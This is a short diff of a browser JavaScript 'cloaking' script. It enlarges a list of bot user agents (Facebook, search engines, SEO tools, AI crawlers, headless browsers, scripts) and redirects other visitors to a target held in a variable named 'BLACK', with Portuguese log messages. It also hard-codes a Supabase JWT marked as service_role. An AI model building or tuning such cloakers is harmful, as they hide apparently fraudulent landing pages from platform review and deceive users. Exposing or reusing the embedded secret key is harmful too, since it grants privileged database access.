@@ -14,12 +14,20 @@
   var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
 
   var BOT_UA = [
+    // Meta/Facebook bots
     "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
-    "linkedinbot","twitterbot","applebot","googlebot","bingbot","slurp",
-    "duckduckbot","baiduspider","yandexbot","sogou","exabot","ia_archiver",
+    "facebook","facebookbot","fb_iab","fbav","instagram","whatsapp",
+    // Google/Bing
+    "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
+    "sogou","exabot","ia_archiver","applebot",
+    // SEO bots
     "mj12bot","ahrefsbot","semrushbot","dotbot","rogerbot","pinterestbot",
-    "petalbot","bytespider","gptbot","chatgpt","claudebot","anthropic",
+    "petalbot","bytespider","linkedinbot","twitterbot",
+    // AI bots
+    "gptbot","chatgpt","claudebot","anthropic","openai",
+    // Headless / automation
     "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
+    // Scripts
     "python-requests","python-urllib","java/","curl/","wget/","libwww",
     "scrapy","httpclient","okhttp","axios","node-fetch","postman",
     "netsystemsresearch","dataforseo","archive.org","commoncrawl"
@@ -98,7 +106,7 @@
       }
     })
     .catch(function(){
-      logCloaker("REAL", "Mobile - IP check falhou, permitido", "?");
+      logCloaker("REAL", "Mobile - IP check falhou, permitido", "BR");
       window.location.replace(appendUtms(BLACK));
     });
 })();
